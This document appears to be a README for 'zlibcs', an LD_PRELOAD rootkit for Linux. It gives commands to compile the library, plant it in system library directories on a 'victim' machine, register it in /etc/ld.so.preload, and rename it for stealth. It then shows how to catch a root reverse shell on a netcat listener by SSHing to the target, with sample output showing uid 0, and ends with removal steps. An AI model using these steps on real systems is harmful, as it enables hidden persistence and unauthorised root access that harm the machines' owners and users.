zlibcs


Compile:
```bash
gcc zlibcs.c -o zlibcs.so -fPIC -shared -ldl -D_GNU_SOURCE
```

## Installation
On the target, copy the shared library/rootkit to where the other shared libraries reside.

64-bit example:
```bash
root@victim:~# cp zlibcs.so /lib/x86_64-linux-gnu/
root@victim:~# cp zlibcs.so /lib/
```
And copy the path of the rootkit into /etc/ld.so.preload.
```bash
root@victim:~# echo "/lib/x86_64-linux-gnu/zlibcs.so" > /etc/ld.so.preload
root@victim:~# echo "/lib/zlibcs.so" > /etc/ld.so.preload
```

I would advise renaming `zlibcs.so` to something more stealthy.

### Verify installation
You can check if the rootkit is installed by running```ldd``` and checking that your malicious library gets loaded.
```bash
root@victim:~# ldd /usr/sbin/sshd
	linux-vdso.so.1 (0x00007ffe9214c000)
	/lib/x86_64-linux-gnu/zlibcs.so (0x00007f17ed354000)
    [...]
```
Also check /etc/ld.so.preload for your entry.
```bash
root@victim:~# cat /etc/ld.so.preload 
/lib/x86_64-linux-gnu/zlibcs.so
```

## Usage
1. Install as above
2. Start a listener to receive reverse shell
```bash
nc -lvnp 9001
```
3. SSH to the target machine. A shell should spawn on your listener.
It (almost) always doens't work the first time, so SSH twice.
```bash
ssh hey@10.11.0.56
hey@10.11.0.56's password:
^C
ssh hey@10.11.0.56
hey@10.11.0.56's password:
^C
```
```bash
nc -lvnp 9001
[...]
Connection received
[+] spawning shell... 
id
uid=0(root) gid=0(root) groups=0(root)
```

## Remove rootkit
Delete `/etc/ld.so.preload` and delete the maliciuos library. 
Nothing else needed.
```bash
root@victim:~# rm /etc/ld.so.preload
root@victim:~# rm /lib/x86_64-linux-gnu/zlibcs.so
```
